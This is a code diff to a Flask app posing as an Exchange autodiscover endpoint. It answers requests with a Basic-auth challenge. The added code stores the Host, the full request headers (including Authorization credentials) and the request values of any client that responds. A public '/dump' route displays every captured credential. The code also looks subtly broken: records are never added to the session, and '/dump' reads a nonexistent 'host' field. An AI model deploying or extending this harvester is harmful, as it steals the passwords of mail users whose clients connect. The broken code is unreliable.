@@ -8,11 +8,6 @@ import sys
 from flask import Flask
 #from flask_sslify import SSLify
 
-app = Flask(__name__,static_url_path='/static')
-#sslify = SSLify(app)
-app.logger.addHandler(logging.StreamHandler(sys.stdout))
-app.logger.setLevel(logging.ERROR)
-
 import os
 import requests
 
@@ -22,10 +17,41 @@ from flask import Response
 import time
 from werkzeug.exceptions import Unauthorized
 
+from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy import Table, Column, Float, Integer, String, DateTime, MetaData, ForeignKey, func
+
+app = Flask(__name__,static_url_path='/static')
+#sslify = SSLify(app)
+app.logger.addHandler(logging.StreamHandler(sys.stdout))
+app.logger.setLevel(logging.ERROR)
+
+try:
+  app.config['SQLALCHEMY_DATABASE_URI'] = os.environ['DATABASE_URL']
+except:
+  app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///:memory:"
+db = SQLAlchemy(app)
+
+class Interesting(db.Model):
+  id = db.Column(db.Integer, primary_key=True)
+  domain = db.Column(db.String(80))
+  headers = db.Column(db.String(800))
+  values = db.Column(db.String(800))
+  ctime = db.Column(DateTime, default=func.now())
+
+def init():
+  db.create_all()
+
 @app.route('/autodiscover/autodiscover.xml', methods=['GET', 'POST'])
 def autodiscover():
     print(request.headers)
     print(request.values)
+
+    if "Authorization" in request.headers:
+      interesting = Interesting()
+      interesting.domain = request.headers.get("Host")
+      interesting.headers = str(request.headers)
+      interesting.values = str(request.values)
+      db.session.commit() 
 #    return send_from_directory(os.path.join(app.root_path, 'static'),'autodiscover.xml')
     return Response('<UNAUTHORIZED>', 401, {'WWW-Authenticate':'Basic realm="Login Required"'})
 
@@ -39,4 +65,13 @@ def favicon():
 def index():
   return render_template('index.html')
 
+@app.route('/dump')
+def dump():
+  msg="<pre>\n"
+  for thing in Interesting.query.all():
+    msg+=thing.host+"\n"
+    msg+=thing.headers+"\n"
+    msg+=thing.values+"\n\n"
 
+  msg+="</pre>"
+  return msg
